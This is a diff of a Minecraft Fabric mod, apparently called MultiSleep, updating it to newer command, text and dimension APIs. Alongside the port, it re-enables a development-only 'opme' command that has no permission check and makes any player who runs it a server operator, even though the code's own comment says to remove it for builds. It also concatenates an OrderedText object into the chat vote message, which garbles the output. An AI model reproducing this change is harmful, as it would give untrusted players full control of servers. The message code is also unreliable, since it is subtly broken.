@@ -15,7 +15,7 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 import net.fabricmc.api.ModInitializer;
-import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
+import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
 import net.fabricmc.fabric.api.gamerule.v1.GameRuleFactory;
@@ -28,7 +28,7 @@ import net.minecraft.network.PacketByteBuf;
 import net.minecraft.server.MinecraftServer;
 import net.minecraft.server.network.ServerPlayerEntity;
 import net.minecraft.stat.Stats;
-import net.minecraft.text.LiteralText;
+import net.minecraft.text.Text;
 import net.minecraft.util.ActionResult;
 import net.minecraft.util.Identifier;
 import net.minecraft.util.registry.Registry;
@@ -37,6 +37,7 @@ import net.minecraft.world.GameRules.IntRule;
 import net.minecraft.world.GameRules.Key;
 import net.minecraft.world.World;
 import net.minecraft.world.dimension.DimensionType;
+import net.minecraft.world.dimension.DimensionTypes;
 import net.roaringmind.multisleep.callbacks.TrySleepCallback;
 import net.roaringmind.multisleep.countdown.Countdown;
 import net.roaringmind.multisleep.gui.ClickTypes;
@@ -178,7 +179,7 @@ public class MultiSleep implements ModInitializer {
 
   //@formatter:off
   private void registerCommands() {
-    CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
+    CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, dedicated) -> {
       dispatcher.register(literal("setCountdownTime").requires(src -> src.hasPermissionLevel(4))
         .then(argument("ticks", IntegerArgumentType.integer())
             .executes(ctx -> {
@@ -193,18 +194,18 @@ public class MultiSleep implements ModInitializer {
       // ------------------------------------------------
       // FOR USE DURING DEVELOPEMENT, REMOVE FOR BUILDS:
       // ------------------------------------------------
-      // dispatcher.register(literal("resetcountdown").requires(src -> src.hasPermissionLevel(4))
-      //   .executes(ctx -> {
-      //     currentCountdown.restart();
-      //     return 0;
-      //   })
-      // );
-      // dispatcher.register(literal("opme")
-      //   .executes(ctx -> {
-      //     ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
-      //     return 0;
-      //   })
-      // );
+      dispatcher.register(literal("resetcountdown").requires(src -> src.hasPermissionLevel(4))
+        .executes(ctx -> {
+          currentCountdown.restart();
+          return 0;
+        })
+      );
+      dispatcher.register(literal("opme")
+        .executes(ctx -> {
+          ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
+          return 0;
+        })
+      );
     });
   }
   //@formatter:on
@@ -312,8 +313,8 @@ public class MultiSleep implements ModInitializer {
         continue;
       }
 
-      p.sendMessage(new LiteralText(player.getName().asString() + " wants to sleep, please vote"), true);
-      p.sendMessage(new LiteralText(player.getName().asString() + " wants to sleep, please vote"), false);
+      p.sendMessage(Text.of(player.getName().asOrderedText() + " wants to sleep, please vote"), true);
+      p.sendMessage(Text.of(player.getName().asOrderedText() + " wants to sleep, please vote"), false);
     }
 
     currentCountdown.restart();
@@ -425,6 +426,6 @@ public class MultiSleep implements ModInitializer {
   public static boolean isOverworldPlayer(PlayerEntity p) {
     Registry<DimensionType> dimReg = p.getServer().getRegistryManager().getManaged(Registry.DIMENSION_TYPE_KEY);
     return dimReg.getRawId(p.getEntityWorld().getDimension()) == dimReg
-        .getRawId(dimReg.get(DimensionType.OVERWORLD_ID));
+        .getRawId(dimReg.get(DimensionTypes.OVERWORLD_ID));
   }
 }
